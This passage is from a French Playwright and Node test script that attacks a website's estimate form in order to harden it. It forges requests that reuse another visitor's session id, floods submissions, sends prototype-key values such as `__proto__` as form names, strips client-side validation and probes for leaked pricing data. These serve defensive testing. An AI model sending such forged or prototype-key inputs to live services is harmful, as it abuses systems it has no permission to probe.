  const SID = sidDe("victime");
  const legitime = await forge(estimation("victime", { email: "zz-victime@exemple.ca" }));
  const vraiMontant = (legitime.fourchette || {}).texte;
  dire("la victime a sa ligne", nbLignes(), 1);
  dire("… et sa fourchette", valeur(2, "Fourchette vue"), vraiMontant);

  const pirate = await forge({
    _form: "estimate", _sid: SID, _etape: 99, _etapes: 99,
    email: "zz-victime@exemple.ca", prix_reaction: "Non", prix_raison: "PIRATE",
    type_de_projet: "Une boutique en ligne", ampleur: "Moins de 25 produits",
    fonctions: "", niveau_design: "Propre et rapide",
    contenu: "Mes textes et mes photos sont prêts",
    echeancier: "Pas de date fixe", taille_equipe: "1 à 5 personnes"
  });
  dire("l'emprunt aboutit — la porte est ouverte, et c'est connu", pirate.success, true);
  dire("AUCUNE seconde ligne n'est née", nbLignes(), 1,
    "le `_sid` reste une identité de LIGNE, pas un droit d'en créer");
  dire("LA FOURCHETTE, ELLE, NE BOUGE PAS", valeur(2, "Fourchette vue"), vraiMontant,
    "la colonne est FIGÉE : c'est bien le montant que la personne a LU qui reste");
  note("« Pourquoi pas » vaut maintenant « " + valeur(2, "Pourquoi pas") + " » — "
    + "un `_sid` connu permet d'écrire dans les colonnes non figées. "
    + "Réserve assumée (`RESERVES.md`) : le `_sid` n'est ni signé ni lié à personne. "
    + "Il ne permet toujours pas de LIRE la ligne.");
}

titre("13 · SOIXANTE ENVOIS D'AFFILÉE, MÊME `_sid`");
{
  remise();
  const SID = sidDe("debit");
  let passes = 0, refuses = 0, muets = 0;
  const messages = new Set();
  for (let i = 0; i < 60; i++) {
    const r = await forge({
      _form: "estimate", _sid: SID, _etape: 1, _etapes: 7,
      email: "zz-debit@exemple.ca", type_de_projet: "Une boutique en ligne"
    });
    if (r.success) passes++;
    else { refuses++; messages.add(String(r.message)); if (!r.message) muets++; }
  }
  dire("le plafond a mordu", refuses > 0, true, passes + " passés, " + refuses + " refusés sur 60");
  dire("il mord au plafond déclaré", passes, gs.REGLAGES.DEBIT_SESSION_MAX,
    "REGLAGES.DEBIT_SESSION_MAX = " + gs.REGLAGES.DEBIT_SESSION_MAX);
  note("vingt envois NE mordent pas, et c'est voulu : le plafond est à "
    + gs.REGLAGES.DEBIT_SESSION_MAX + " par " + gs.REGLAGES.DEBIT_SESSION_FENETRE_S + " s. "
    + "Un formulaire de six écrans qui s'enregistre à chaque clic en produit déjà une dizaine.");
  dire("ET IL LE DIT", [...messages].every((m) => m && m !== "undefined"), true, [...messages].join(" | "));
  dire("le message n'accuse pas le visiteur",
    /trop d.envois/i.test([...messages][0] || ""), true, [...messages][0]);
  dire("aucun refus muet", muets, 0);
  dire("une seule ligne malgré les passages", nbLignes(), 1);

  const autre = await forge({
    _form: "estimate", _sid: sidDe("debitVoisin"), _etape: 1, _etapes: 7,
    email: "zz-voisin@exemple.ca", type_de_projet: "Une boutique en ligne"
  });
  dire("TÉMOIN · un autre `_sid` passe encore", autre.success, true, autre.message || "");
  dire("… et il a sa propre ligne", nbLignes(), 2);
}

titre("14 · DEUX ENVOIS LANCÉS ENSEMBLE, MÊME `_sid`");
{
  remise();
  const c = estimation("simul", { email: "zz-simul@exemple.ca" });
  const [a, b] = await Promise.all([forge(c), forge(c)]);
  dire("les deux répondent", a.success && b.success, true,
    JSON.stringify([a.message, b.message]));
  dire("UNE SEULE LIGNE au classeur", nbLignes(), 1,
    "deux lignes pour un visiteur = un lead compté deux fois et rappelé deux fois");
  dire("et une seule fourchette écrite", valeur(2, "Fourchette vue"), (a.fourchette || {}).texte);
  note("RÉSERVE : Node est mono-fil et `LockService` est un bouchon. Ce cas prouve que "
    + "la RECHERCHE de ligne par signature dédoublonne ; il ne prouve pas que le verrou "
    + "Apps Script tient contre une vraie concurrence.");
}

titre("15 · LE FORMULAIRE QU'ON NE CONNAÎT PAS");
{
  remise();
  const CAS = [
    ["inconnu", "estimation"],
    ["vide", ""],
    ["en majuscules", "ESTIMATE"],
    ["« constructor »", "constructor"],
    ["« toString »", "toString"],
    ["« hasOwnProperty »", "hasOwnProperty"],
    ["« __proto__ »", "__proto__"]
  ];
  for (const [quoi, forme] of CAS) {
    const r = await forge(estimation("frm", { _form: forme }));
    dire("`_form` " + quoi + " : refusé", r.success, false, r.message);
    /* LE MESSAGE COMPTE AUTANT QUE LE REFUS. « Le service a
       rencontré une erreur » veut dire qu'on a levé plus loin —
       donc qu'on a traversé le garde, et que le journal Apps Script
       se remplit d'exceptions à chaque requête d'un robot. */
    dire("`_form` " + quoi + " : refusé PROPREMENT",
      /formulaire inconnu/i.test(String(r.message)), true,
      "« " + r.message + " » — un refus par exception a traversé le garde");
  }
  const absent = await forge(Object.assign(estimation("frmY"), { _form: undefined }));
  dire("`_form` absent : refusé", absent.success, false, absent.message);
  dire("aucune ligne n'est née de tout ça", nbLignes(), 0);

  remise();
  const bon = await forge(estimation("frmOk"));
  dire("TÉMOIN · `_form: \"estimate\"` passe", bon.success, true, bon.message || "");
}

titre("16 · AUCUN MONTANT DE LA GRILLE DANS UNE RÉPONSE DU SERVICE");
{
  for (const q of ["", "?action=diag"]) {
    try {
      const r = await fetch("http://127.0.0.1:" + PORT_G + "/exec" + q);
      REPONSES.push({ ou: "GET " + (q || "/"), corps: await r.text() });
    } catch (e) { arret("la porte GET « " + q + " » n'a pas répondu : " + e.message); }
  }
  if (REPONSES.length < 40) {
    arret("seulement " + REPONSES.length + " réponses collectées — "
      + "l'outil n'a pas assez regardé pour conclure « aucune fuite ».");
  }
  note("réponses examinées : " + REPONSES.length);

  /* CE QU'ON CHERCHE : un module de la grille rendu en clair. Les
     CRANS de l'échelle, eux, PARAISSENT — c'est la fourchette
     elle-même, et c'est voulu. On cherche donc les montants qui ne
     sont PAS des crans : les modules, la base, les paliers. */
  const CRANS = new Set(gs.ESTIM_ECHELLE.map(String));
  const modules = new Set();
  Object.keys(gs.ESTIM_GRILLE).forEach((k) => {
    const g = gs.ESTIM_GRILLE[k];
    [g.base].concat(Object.values(g.ampleur), Object.values(g.fonctions),
      Object.values(g.visuel), Object.values(g.facteur.valeurs))
      .forEach((v) => { if (v > 0 && !CRANS.has(String(v))) modules.add(v); });
  });
  const listeModules = [...modules].sort((a, b) => b - a);
  if (!listeModules.length) arret("aucun module hors-cran dans la grille — la sonde n'a rien à chercher.");
  note("montants de la grille qui ne sont PAS des crans : " + listeModules.join(", "));

  const motif = new RegExp("(?:^|[^0-9])(" + listeModules.join("|") + ")(?:[^0-9]|$)");
  const fautes = [];
  REPONSES.forEach((r) => {
    const c = String(r.corps || "").replace(/[\s ]/g, "");
    const m = motif.exec(c);
    if (m) fautes.push(r.ou + " · « " + m[1] + " » dans : " + String(r.corps).slice(0, 140));
  });
  dire("aucun module de la grille ne fuit dans une réponse", fautes.length, 0,
    fautes.slice(0, 4).join("\n         · "));

  dire("TÉMOIN D'INSTRUMENT · la sonde VOIT un module rendu en clair",
    motif.test('{"module":"' + listeModules[0] + '"}'), true);
  dire("TÉMOIN D'INSTRUMENT · et elle ne prend pas un cran pour un module",
    motif.test('{"texte":"' + gs.ESTIM_ECHELLE[0] + '"}'), false);
}

/* ============================================================
   PARTIE II — PAR LE NAVIGATEUR
   ============================================================ */
console.log("");
console.log("############################################################");
console.log("PARTIE II · PAR LE NAVIGATEUR");
console.log("############################################################");

const nav = await chromium.launch();

/* `js/config.local.js` EST INTERCEPTÉ, PAS RÉÉCRIT. Écrire le vrai
   fichier depuis un outil de mesure écraserait la configuration de
   celui qui le lance. Et poser `window.APED_ENVOI` par
   `addInitScript` ne marche PAS : ce script tourne AVANT les
   fichiers de la page, donc `config.local.js`, chargé ensuite,
   écrase la valeur avec la sienne. (D-742) */
async function ouvrir(options) {
  const o = options || {};
  const ctx = await nav.newContext({
    viewport: { width: o.largeur || 1440, height: o.hauteur || 950 },
    reducedMotion: o.mouvementReduit ? "reduce" : "no-preference"
  });
  const page = await ctx.newPage();

  const erreurs = [];   /* exceptions JS : toujours zéro */
  const reseau = [];    /* échecs de requête */
  const dialogues = []; /* un `alert()` ici = du script exécuté */
  const posts = [];     /* tout ce qui part vers le service */

  page.on("console", (m) => {
    if (m.type() !== "error") return;
    (/ERR_|Failed to load resource|net::/.test(m.text()) ? reseau : erreurs).push(m.text());
  });
  page.on("pageerror", (e) => erreurs.push(String(e)));
  page.on("dialog", (d) => { dialogues.push(d.type() + " : " + d.message()); d.dismiss().catch(() => {}); });
  page.on("request", (r) => {
    if (r.method() !== "POST") return;
    if (r.url().indexOf(":" + PORT_G) === -1) return;
    let corps = "";
    try { corps = r.postData() || ""; } catch (e) {}
    posts.push(corps);
  });
  page.on("response", async (r) => {
    if (r.url().indexOf(":" + PORT_G) === -1) return;
    try { REPONSES.push({ ou: "navigateur", corps: (await r.text()).slice(0, 4000) }); } catch (e) {}
  });

  await page.route("**/js/config.local.js", (route) => route.fulfill({
    status: 200, contentType: "text/javascript; charset=utf-8",
    body: "window.APED_ENVOI = " + JSON.stringify(GOOGLE) + ";\n"
  }));

  /* `js/main.js` peut être servi DÉSARMÉ, pour prouver qu'une garde
     mord vraiment. Le fichier du dépôt n'est jamais touché : on
     réécrit la RÉPONSE, pas le disque. */
  if (o.desarmer) {
    const brut = await (await fetch(BASE + "/js/main.js")).text();
    const patche = o.desarmer(brut);
    if (patche === brut) {
      arret("le désarmement de `js/main.js` n'a rien changé — l'ancre a bougé, "
        + "et le cas prouverait exactement l'inverse de ce qu'il annonce.");
    }
    await page.route("**/js/main.js", (route) => route.fulfill({
      status: 200, contentType: "text/javascript; charset=utf-8", body: patche
    }));
  }

  await page.addInitScript(() => {
    try {
      /* Le popup cadeau s'ouvre en `showModal()` et capture tous les
         événements de pointeur : sans ça chaque clic expire et
         accuse le mauvais coupable. (piège 18) */
      sessionStorage.setItem("aped-sans-popup", "1");
      sessionStorage.setItem("aped-entree-saut", "1");
      /* La retenue s'arme à la FERMETURE d'une modale — c'est-à-dire
         au beau milieu du cas 22 — et son formulaire poste une
         requête de plus. Elle fausserait le comptage sans rien
         apprendre sur l'estimateur. */
      localStorage.setItem("aped-retenue-vue", "1");
    } catch (e) {}
  });

  await page.goto(BASE + "/index.html", { waitUntil: "load" });
  /* UNE SONDE LUE AVANT 3 s NE VOIT PAS LA VRAIE PAGE : `data-palier`
     arrive après, et il change la peinture. (piège 87) */
  await page.waitForFunction(() => document.documentElement.hasAttribute("data-palier"),
    null, { timeout: 10000 }).catch(() => {});
  await page.waitForTimeout(600);
  return { ctx, page, erreurs, reseau, dialogues, posts };
}

async function palier(page) {
  return page.evaluate(() => document.documentElement.getAttribute("data-palier"));
}

async function ouvrirEstim(page) {
  await page.evaluate(() => {
    document.querySelectorAll(".modal").forEach((m) => { m.hidden = true; });
    ["project", "estimate", "refer", "booking"].forEach((k) => {
      try { localStorage.removeItem("aped-brouillon-" + k); } catch (e) {}
      try { localStorage.removeItem("aped-sid-" + k); } catch (e) {}
    });
    const b = document.querySelector('[data-modal-open="modal-estimate"]');
    if (b) b.click();
  });
  await page.waitForTimeout(500);
  const vu = await page.evaluate(() => !document.getElementById("modal-estimate").hidden);
  if (!vu) arret("la modale d'estimation ne s'ouvre pas.");
}
async function fermerEstim(page) {
  await page.evaluate(() => {
    const b = document.querySelector("#modal-estimate .modal-head [data-modal-close]");
    if (b) b.click();
  });
  await page.waitForTimeout(400);
}
async function ecran(page) {
  return page.evaluate(() => {
    const s = document.querySelector("#wizard .step[data-step]:not([hidden])");
    return s ? Number(s.dataset.step) : 0;
  });
}
async function choisir(page, cle, val) {
  const ok = await page.evaluate(([c, v]) => {
    const s = document.querySelector("#wizard .step[data-step]:not([hidden])");
    const g = s && s.querySelector('.options[data-key="' + c + '"]');
    if (!g) return false;
    const b = [...g.querySelectorAll("button")].find((x) => x.dataset.value === v);
    if (!b) return false;
    b.click();
    return true;
  }, [cle, val]);
  if (!ok) arret("impossible de choisir « " + val + " » pour « " + cle + " » (écran " + await ecran(page) + ")");
  await page.waitForTimeout(220);
}
async function cocher(page, valeurs) {
  const k = await page.evaluate((vs) => {
    const s = document.querySelector("#wizard .step[data-step]:not([hidden])");
    let n = 0;
    vs.forEach((v) => {
      const c = s.querySelector('input[type="checkbox"][value="' + CSS.escape(v) + '"]');
      if (c) { c.checked = true; c.dispatchEvent(new Event("change", { bubbles: true })); n++; }
    });
    return n;
  }, valeurs);
  if (k !== valeurs.length) arret("cases introuvables : " + valeurs.join(" | "));
  await page.waitForTimeout(150);
}
async function continuer(page) {
  const avant = await ecran(page);
  await page.evaluate(() => {
    const s = document.querySelector("#wizard .step[data-step]:not([hidden])");
    const b = s && s.querySelector("[data-esuivant]");
    if (b) b.click();
  });
  await page.waitForTimeout(300);
  return (await ecran(page)) !== avant;
}
async function statut(page, sel) {
  return page.evaluate((s) => {
    const e = document.querySelector(s);
    return e ? (e.textContent || "").trim() : "";
  }, sel || "#estimateStatus");
}
async function fourchetteVue(page) {
  return page.evaluate(() => {
    const b = document.getElementById("esDevis");
    const m = document.getElementById("esFourchette");
    return { visible: !!(b && !b.hidden), texte: m ? (m.textContent || "").trim() : "" };
  });
}

/* Le chemin « boutique » complet, jusqu'à l'écran des coordonnées. */
async function jusquAuxCoordonnees(page) {
  await choisir(page, "type_de_projet", "Une boutique en ligne");
  await choisir(page, "ampleur", "25 à 250 produits");
  await cocher(page, ["Le paiement en ligne", "Le calcul de la livraison"]);
  if (!await continuer(page)) arret("bloqué à l'écran des fonctions.");
  await choisir(page, "niveau_design", "Propre et rapide");
  await choisir(page, "contenu", "J’en ai une partie");
  if (!await continuer(page)) arret("bloqué à l'écran du soin.");
  await choisir(page, "echeancier", "Dans 1 à 3 mois");
  await choisir(page, "taille_equipe", "1 à 5 personnes");
  if (!await continuer(page)) arret("bloqué à l'écran de l'échéance.");
  const e = await ecran(page);
  if (e !== 13) arret("l'écran des coordonnées n'est pas atteint : on est à " + e + ".");
}

/* ------------------------------------------------------------
   17 · LE DOUBLE CLIC SUR « VOIR MA FOURCHETTE »

   Deux clics dans la MÊME image : c'est le geste d'un pouce nerveux
   sur un téléphone lent. Un `dblclick` de Playwright laisse passer
   une image entre les deux et ne prouve pas la même chose.
   ------------------------------------------------------------ */
titre("17 · DEUX CLICS SUR « VOIR MA FOURCHETTE »");
{
  remise();
  const { ctx, page, erreurs, posts } = await ouvrir();
  await ouvrirEstim(page);
  await jusquAuxCoordonnees(page);
  await page.fill("#esName", "ZZTEST Double");
  await page.fill("#esEmail", "zz-double@exemple.ca");
  await page.fill("#esPhone", "418 555 0142");

  const avant = posts.filter((c) => c.indexOf('"_final":true') !== -1).length;
  await page.evaluate(() => {
    const b = document.querySelector('#modal-estimate form[data-form="estimate"] [data-submit]');
    b.click(); b.click();
  });
  await page.waitForTimeout(1800);

  const finals = posts.filter((c) => c.indexOf('"_final":true') !== -1).length - avant;
  dire("UNE seule requête FINALE est partie", finals, 1,
    "le bouton se désactive dès le premier clic");
  dire("UNE seule ligne au classeur", nbLignes(), 1);
  dire("l'écran du chiffre paraît", await ecran(page), 14);
  dire("et le chiffre y est", MONTANT.test((await fourchetteVue(page)).texte), true,
    JSON.stringify(await fourchetteVue(page)));
  dire("aucune erreur console", erreurs.length, 0, erreurs.slice(0, 2).join(" | "));
  note("data-palier au moment du verdict : " + await palier(page));
  await page.screenshot({ path: path.join(SORTIE, "17-double-clic.png") });
  await ctx.close();
}

titre("18 · DEUX CLICS SUR « CONTINUER »");
{
  remise();
  const { ctx, page, erreurs } = await ouvrir();
  await ouvrirEstim(page);
  await choisir(page, "type_de_projet", "Une boutique en ligne");
  await choisir(page, "ampleur", "25 à 250 produits");
  await cocher(page, ["Le paiement en ligne"]);
  const avant = await ecran(page);
  dire("on est bien à l'écran des fonctions", avant, 8);
  await page.evaluate(() => {
    const s = document.querySelector("#wizard .step[data-step]:not([hidden])");
    const b = s.querySelector("[data-esuivant]");
    b.click(); b.click();
  });
  await page.waitForTimeout(500);
  dire("on n'a avancé QUE d'un écran", await ecran(page), 11,
    "sauter un écran fait perdre une réponse, et le compte « X sur N » ment ensuite");
  dire("aucune erreur console", erreurs.length, 0, erreurs.slice(0, 2).join(" | "));
  await ctx.close();
}

/* ------------------------------------------------------------
   19 · LES CHAMPS OBLIGATOIRES RETIRÉS À LA CONSOLE

   `validate()` sert au visiteur, jamais à la sécurité. Deux
   preuves : le navigateur bloque quand il est intact, et le
   SERVEUR refuse quand il ne l'est plus.
   ------------------------------------------------------------ */
titre("19 · LE FORMULAIRE ENVOYÉ VIDE, PUIS SANS `required`");
{
  remise();
  const { ctx, page, erreurs, posts } = await ouvrir();
  await ouvrirEstim(page);
  await jusquAuxCoordonnees(page);

  const avant = posts.length;
  await page.evaluate(() => {
    document.querySelector('#modal-estimate form[data-form="estimate"] [data-submit]').click();
  });
  await page.waitForTimeout(700);
  dire("vide : on reste sur l'écran des coordonnées", await ecran(page), 13);
  dire("vide : AUCUNE requête n'est partie", posts.length - avant, 0,
    "afficher un refus après avoir posté ne protège de rien");
  const fautifs = await page.evaluate(() =>
    [...document.querySelectorAll('#modal-estimate form[data-form="estimate"] .field.is-invalid')]
      .map((f) => { const i = f.querySelector("input,textarea"); return i ? i.id : "?"; }));
  dire("vide : les trois champs sont nommés", fautifs.join(","), "esName,esEmail,esPhone",
    "marqués : " + JSON.stringify(fautifs));

  /* MAINTENANT ON RETIRE `required`, comme le ferait n'importe qui
     avec la console ouverte. */
  await page.evaluate(() => {
    ["esName", "esEmail", "esPhone"].forEach((id) => {
      document.getElementById(id).removeAttribute("required");
    });
  });
  const avant2 = posts.length;
  await page.evaluate(() => {
    document.querySelector('#modal-estimate form[data-form="estimate"] [data-submit]').click();
  });
  await page.waitForTimeout(1800);
  dire("désarmé au DOM : la requête part maintenant", posts.length - avant2 >= 1, true,
    "si elle ne partait pas, le cas ne testerait pas le serveur");
  dire("LE SERVEUR REFUSE", nbLignes(), 0,
    "aucune ligne ne doit naître d'un formulaire vide, quoi qu'ait fait le navigateur");
  const msg = await statut(page);
  dire("… et il dit pourquoi, à l'écran",
    /manque une réponse obligatoire/i.test(msg), true, "« " + msg + " »");
  dire("aucune erreur console", erreurs.length, 0, erreurs.slice(0, 2).join(" | "));

  /* TÉMOIN : les mêmes champs remplis passent. */
  await page.fill("#esName", "ZZTEST Requis");
  await page.fill("#esEmail", "zz-requis@exemple.ca");
  await page.fill("#esPhone", "418 555 0142");
  await page.evaluate(() => {
    document.querySelector('#modal-estimate form[data-form="estimate"] [data-submit]').click();
  });
  await page.waitForTimeout(1800);
  dire("TÉMOIN · remplis, ça passe", await ecran(page), 14);
  dire("TÉMOIN · et la ligne existe", nbLignes(), 1);
  await ctx.close();
}

titre("20 · DIX MILLE SIGNES COLLÉS DANS « #esBesoin » (maxlength 3000)");
{
  remise();
  const { ctx, page, erreurs, posts } = await ouvrir();
  await ouvrirEstim(page);
  await choisir(page, "type_de_projet", "Automatiser des tâches qui me prennent du temps");
  dire("on est bien sur le chemin sans prix", await ecran(page), 6);

  const long = "A".repeat(10000);
  await page.evaluate((v) => {
    const t = document.getElementById("esBesoin");
    t.value = v;
    t.dispatchEvent(new Event("input", { bubbles: true }));
  }, long);
  dire("le collage par script franchit bien `maxlength`",
    (await page.inputValue("#esBesoin")).length, 10000,
    "`maxlength` borne la SAISIE, pas un collage posé par script");

  const avant = posts.length;
  dire("« Continuer » refuse", await continuer(page), false);
  dire("on reste sur l'écran du besoin", await ecran(page), 6);
  const marque = await page.evaluate(() =>
    !!document.querySelector('#wizard .step[data-step="6"] .field.is-invalid'));
  dire("et le champ est marqué fautif", marque, true);
  dire("aucun envoi FINAL n'est parti",
    posts.slice(avant).filter((c) => c.indexOf('"_final":true') !== -1).length, 0);
  dire("le texte du visiteur n'est pas effacé",
    (await page.inputValue("#esBesoin")).length, 10000, "on refuse, on n'efface pas");

  /* TÉMOIN : 2 900 signes passent. */
  await page.evaluate(() => {
    const t = document.getElementById("esBesoin");
    t.value = "A".repeat(2900);
    t.dispatchEvent(new Event("input", { bubbles: true }));
  });
  dire("TÉMOIN · 2 900 signes passent", await continuer(page), true);
  dire("aucune erreur console", erreurs.length, 0, erreurs.slice(0, 2).join(" | "));
  await ctx.close();
}

/* ------------------------------------------------------------
   21 · OUI, PUIS NON, PUIS OUI

   Trois clics, trois envois. Une seule ligne, et la DERNIÈRE
   valeur gagne — sauf la fourchette, qui est figée.
   ------------------------------------------------------------ */
titre("21 · « OUI » PUIS « NON » PUIS « OUI »");
{
  remise();
  const { ctx, page, erreurs } = await ouvrir();
  await ouvrirEstim(page);
  await jusquAuxCoordonnees(page);
  await page.fill("#esName", "ZZTEST Girouette");
  await page.fill("#esEmail", "zz-girouette@exemple.ca");
  await page.fill("#esPhone", "418 555 0142");
  await page.evaluate(() => {
    document.querySelector('#modal-estimate form[data-form="estimate"] [data-submit]').click();
  });
  await page.waitForTimeout(1800);
  const premier = (await fourchetteVue(page)).texte;
  dire("le chiffre paraît", MONTANT.test(premier), true, premier);
  dire("une ligne au classeur", nbLignes(), 1);

  const clic = async (v) => {
    await page.evaluate((val) => {
      const b = document.querySelector('#esDevisQuestion .choices button[data-value="' + val + '"]');
      if (b) b.click();
    }, v);
    await page.waitForTimeout(900);
    /* La question se cache après un clic : on la rouvre pour le
       suivant, exactement comme un visiteur qui revient sur ses pas
       ne le peut PAS — d'où l'intérêt de vérifier ce que ça écrit. */
    await page.evaluate(() => {
      const q = document.getElementById("esDevisQuestion");
      if (q) q.hidden = false;
    });
  };
  await clic("Oui");
  const apresOui = valeur(2, "Ça convient ?");
  await clic("Non");
  const apresNon = valeur(2, "Ça convient ?");
  await clic("Oui");
  await page.waitForTimeout(600);

  dire("après « Oui » la colonne dit « Oui »", apresOui, "Oui");
  dire("après « Non » elle dit « Non »", apresNon, "Non");
  dire("après le second « Oui » elle dit « Oui »", valeur(2, "Ça convient ?"), "Oui",
    "la dernière réponse est celle qui compte");
  dire("TOUJOURS UNE SEULE LIGNE", nbLignes(), 1,
    "trois avis d'une même personne ne font pas trois leads");
  dire("LA FOURCHETTE N'A PAS BOUGÉ", valeur(2, "Fourchette vue"), premier,
    "la colonne est FIGÉE : c'est le montant que la personne a LU qui reste");
  dire("l'étape reste « ✓ complète »", valeur(2, "Étape"), "✓ complète",
    "un envoi de réaction porte `_etape: 99` et ne doit pas faire reculer l'étape");
  dire("aucune erreur console", erreurs.length, 0, erreurs.slice(0, 2).join(" | "));
  await ctx.close();
}

/* ------------------------------------------------------------
   22 · FERMER AU MILIEU, ROUVRIR

   `resetEstimate()` est appelé par `openModal`. Rien du visiteur
   précédent ne doit reparaître — ni ses choix, ni son chiffre, ni
   sa phrase, ni son identifiant de session.
   ------------------------------------------------------------ */
titre("22 · FERMER LA MODALE AU MILIEU, PUIS ROUVRIR");
{
  remise();
  const { ctx, page, erreurs } = await ouvrir();

  /* Premier visiteur : il va jusqu'au bout, dit « Non », et tape. */
  await ouvrirEstim(page);
  await jusquAuxCoordonnees(page);
  await page.fill("#esName", "ZZTEST Premier");
  await page.fill("#esEmail", "zz-premier@exemple.ca");
  await page.fill("#esPhone", "418 555 0142");
  await page.evaluate(() => {
    document.querySelector('#modal-estimate form[data-form="estimate"] [data-submit]').click();
  });
  await page.waitForTimeout(1800);
  const chiffre1 = (await fourchetteVue(page)).texte;
  dire("le premier visiteur a son chiffre", MONTANT.test(chiffre1), true, chiffre1);
  await page.evaluate(() => {
    const b = document.querySelector('#esDevisQuestion .choices button[data-value="Non"]');
    if (b) b.click();
  });
  await page.waitForTimeout(700);
  await page.fill("#esPrixRaison", "MA PHRASE PRIVEE");
  await fermerEstim(page);

  /* Second visiteur, même appareil. */
  await page.evaluate(() => {
    const b = document.querySelector('[data-modal-open="modal-estimate"]');
    if (b) b.click();
  });
  await page.waitForTimeout(600);

  dire("on repart de l'écran 1", await ecran(page), 1);
  const restes = await page.evaluate(() => ({
    choisis: [...document.querySelectorAll('#wizard [data-key] button[aria-pressed="true"]')]
      .map((b) => b.dataset.value),
    coches: [...document.querySelectorAll('#wizard [data-checks] input:checked')].map((c) => c.value),
    besoin: (document.getElementById("esBesoin") || {}).value,
    nom: (document.getElementById("esName") || {}).value,
    courriel: (document.getElementById("esEmail") || {}).value,
    tel: (document.getElementById("esPhone") || {}).value,
    raison: (document.getElementById("esPrixRaison") || {}).value,
    devisVu: !document.getElementById("esDevis").hidden,
    petitVu: !document.getElementById("esPetit").hidden,
    sansPrixVu: !document.getElementById("esSansPrix").hidden,
    compte: (document.getElementById("estimCompte") || {}).textContent,
    total: (document.getElementById("estimTotal") || {}).textContent
  }));
  dire("aucune réponse à choix ne reste marquée", restes.choisis.length, 0, JSON.stringify(restes.choisis));
  dire("aucune case ne reste cochée", restes.coches.length, 0, JSON.stringify(restes.coches));
  dire("le champ du besoin est vide", restes.besoin, "");
  dire("le nom est vide", restes.nom, "");
  dire("le courriel est vide", restes.courriel, "");
  dire("le téléphone est vide", restes.tel, "");
  dire("LA PHRASE DU PRÉCÉDENT NE RESTE PAS", restes.raison, "",
    "`#esPrixRaison` vit DEHORS du <form> : `form.reset()` ne l'atteint pas. "
    + "Laissée là, elle repart au classeur sous le nom du visiteur SUIVANT");
  dire("la boîte du chiffre est refermée", restes.devisVu, false);
  dire("la version allégée est refermée", restes.petitVu, false);
  dire("l'écran sans prix est refermé", restes.sansPrixVu, false);
  dire("le compte repart à 1 sur 6", restes.compte + "/" + restes.total, "1/6");
  dire("l'identifiant de session a été oublié après le succès",
    await page.evaluate(() => localStorage.getItem("aped-sid-estimate")), null,
    "sinon le visiteur suivant écraserait la ligne du précédent");

  /* Le second visiteur finit son parcours : sa ligne doit être une
     SECONDE ligne, pas une réécriture de la première. */
  await jusquAuxCoordonnees(page);
  await page.fill("#esName", "ZZTEST Second");
  await page.fill("#esEmail", "zz-second@exemple.ca");
  await page.fill("#esPhone", "418 555 0143");
  await page.evaluate(() => {
    document.querySelector('#modal-estimate form[data-form="estimate"] [data-submit]').click();
  });
  await page.waitForTimeout(1800);
  dire("le second a SA propre ligne", nbLignes(), 2);
  dire("et la ligne du premier n'a pas bougé",
    valeur(ligneDe("zz-premier@exemple.ca"), "Nom"), "ZZTEST Premier");
  dire("sa phrase privée est restée sur SA ligne",
    valeur(ligneDe("zz-premier@exemple.ca"), "Pourquoi pas").indexOf("MA PHRASE PRIVEE") !== -1, true,
    "lu : " + valeur(ligneDe("zz-premier@exemple.ca"), "Pourquoi pas"));
  dire("et elle n'a PAS déteint sur celle du second",
    valeur(ligneDe("zz-second@exemple.ca"), "Pourquoi pas"), "");
  dire("aucune erreur console", erreurs.length, 0, erreurs.slice(0, 2).join(" | "));
  await ctx.close();
}

/* ------------------------------------------------------------
   23 · LES CIBLES AU POUCE, EN 390 px — LARGEUR ET HAUTEUR

   MESURÉES, PAS DÉDUITES, et sur les QUATORZE écrans : un
   `data-step` masqué mesure zéro, donc il faut le rendre visible
   pour le voir.

   LA LARGEUR AUTANT QUE LA HAUTEUR. Un défaut est resté six mois
   parce qu'on ne mesurait que la hauteur — WCAG 2.5.8 exige un
   carré de 24 px, la règle de ce dépôt en exige 44 dans les DEUX
   sens, et un bouton de 30 × 48 échoue.
   ------------------------------------------------------------ */
titre("23 · TOUTES LES CIBLES DES QUATORZE ÉCRANS, EN 390 × 844");
{
  remise();
  const { ctx, page } = await ouvrir({ largeur: 390, hauteur: 844 });
  note("data-palier : " + await palier(page));
  await ouvrirEstim(page);

  const MESURE = () => {
    const out = [];
    const sel = ["button", "select", "textarea", "input:not([type=hidden])",
      "a[href]", "[role=button]", "summary"].map((s) => "#modal-estimate " + s).join(",");
    document.querySelectorAll(sel).forEach((el) => {
      if (el.closest(".piege")) return;   /* un piège à robots n'a pas à être confortable au pouce */

      /* LA CIBLE D'UNE CASE À COCHER, C'EST SON ÉTIQUETTE. Un
         `<input type=checkbox>` fait 16 px partout dans le monde ;
         ce qu'on TOUCHE, c'est le `<label>` qui l'enveloppe, et
         c'est lui que WCAG 2.5.8 mesure. */
      let cible = el, via = "";
      if (el.tagName === "INPUT" && (el.type === "checkbox" || el.type === "radio")) {
        const lab = el.closest("label")
          || (el.id ? document.querySelector('label[for="' + el.id.replace(/"/g, '\\"') + '"]') : null);
        if (lab) { cible = lab; via = " (par son étiquette)"; }
      }
      const r = cible.getBoundingClientRect();
      if (r.width < 1 || r.height < 1) return;   /* masqué : hors sujet */

      const p = el.parentElement;
      const enLigne = el.tagName === "A" && p
        && ["P", "LI", "SPAN", "TD", "EM", "STRONG", "SMALL", "B"].indexOf(p.tagName) !== -1;
      out.push({
        quoi: String(el.id || el.getAttribute("data-value") || el.getAttribute("name")
          || el.className || el.tagName).slice(0, 52) + via,
        l: Math.round(r.width * 10) / 10,
        h: Math.round(r.height * 10) / 10,
        enLigne: enLigne
      });
    });
    return out;
  };

  /* On force chaque écran visible, un par un, sous-blocs et boîtes
     de résultat DÉPLIÉS : c'est le seul moyen de tous les voir. */
  const tout = [];
  for (let e = 1; e <= 14; e++) {
    await page.evaluate((k) => {
      document.querySelectorAll("#wizard .step[data-step]").forEach((s) => {
        s.hidden = Number(s.dataset.step) !== k;
      });
      document.querySelectorAll("#wizard .step-second[data-pour]").forEach((b) => { b.hidden = false; });
      if (k === 14) {
        ["esDevis", "esDevisQuestion", "esDevisOui", "esDevisNon", "esPetit", "esSansPrix"]
          .forEach((id) => { const x = document.getElementById(id); if (x) x.hidden = false; });
      }
    }, e);
    await page.waitForTimeout(180);
    (await page.evaluate(MESURE)).forEach((x) => tout.push(Object.assign({ ecran: e }, x)));
  }

  /* ZÉRO RÉSULTAT DOIT ARRÊTER L'OUTIL, ET « PRESQUE ZÉRO » AUSSI.
     Quatorze écrans portent au bas mot cinquante boutons ; en
